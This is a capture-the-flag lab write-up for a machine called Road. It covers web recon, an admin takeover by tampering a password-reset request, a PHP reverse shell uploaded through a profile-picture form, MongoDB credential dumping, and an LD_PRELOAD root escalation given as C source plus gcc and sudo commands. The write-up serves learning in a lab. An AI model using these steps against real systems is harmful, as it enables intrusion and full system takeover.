## Road

---

Tags: Linux, php, preload

Tools: nmap, dirb, c, gcc, mongoDB

Process:

* As usual I start with an `nmap -A <ip> > scan` which reveals ports open on 22 and 80.

* I also start a dirb subdirectory search with Web-Content/directory-list-2.3-small wordlist from seclists as well as one with dirb -w and the default wordlist.

* I notice on the website's main page, there is a link to a login page, a package tracker field/link, and a contact form.

    * I learned about a tool called `whatweb` that can help identify the tech stack being used on a site.

* I poked around the website and subdirectories from the scans including "v2" and "phpMyAdmin" and it seems that there aren't any default credentials being used and that the services being used are up to date.

* Although there is no access through default creds, an account can be made and used to access the services. This gives access to the dashboard at /v2/.

* After poking around the dashboard a little bit, a few things stick out. On the user profile page, it is possible to upload a profile picture and I'm thinking this could be a file upload vulnerability. Also, when searching for AWB/Waybill numbers, I get a screen that says something along the lines of "Due to a ton of complaints, we're working on this. Sorry" and then it redirects to the dashboard. There is also a reset profile link which is basically just a password reset.

* There is a note on the profile picture upload that says only the admin can do this right now and it gives the admin email address for contact. Because email accounts are usernames on this sight, I can reset the password of the admin using the reset password link and burpsuite, swapping out the relavent details for the admin account. It works.

* Now the profile picture upload can be used to deploy a reverse shell. By viewing the source code of the profile page, the directory of the pfp uploads is obtainable. Then by uploading a pentest monkey php shell and executing it by navigating to it in the browser, I get a reverse shell.

* I collect the user flag from the user directory in /home/.

* Then I start enumerating privesc vectors. After a couple manual checks, I upload linpeas using wget and a local http server on my attack machine. chmod +x it on the target machine and execute it.

    *Took a detour here to reformat some of my notes on shell stabilization as I was running into issues that I've had for some time and wanted to address them*

* From `cat /etc/passwd` it is found that MongoDB and MySQL are on the system.

* I access the MongoDB database by the following commands:

    * `mongo`

    * `help` ... lol

    * `show dbs`

    * `use <db name>` for the different dbs I was shown in the previous command

    * `show collections`

    * `db.<collection>.find();`

* From this I got a user:pass

* With this new user I run `sudo -l` and see this user can run /usr/bin/sky_backup_utility with NOPASSWD.

    * This binary has r/w/x privs and is owned by root.

    * The user also has env_keep+=LD_PRELOAD

* These can be leveraged to create a privesc vector

    * The a c file can be made with the following code:

        *
        ``` c
        #include <stdio.h>
        #include <stdlib.h>

            void _init(){
                unsetenv("LD_PRELOAD");
                setuid(0);
                setgid(0);
                system("/bin/sh");
            }
        ```

    * Compiled with the following command:

        * `gcc -shared -fPIC -o <name>.so <name>.c -nostartfiles`

    * Then run the command:

        * `sudo LD_PRELOAD=/Path/to/<name>.so /Path/to/binary`

            * In this case the binary is the /usr/bin/sky... binary. Also, it was necessary for me to include the full path of the .so file, not just the relative path from PWD, even though I was already in the directory.

* Root shell is obtained and flag is acquired!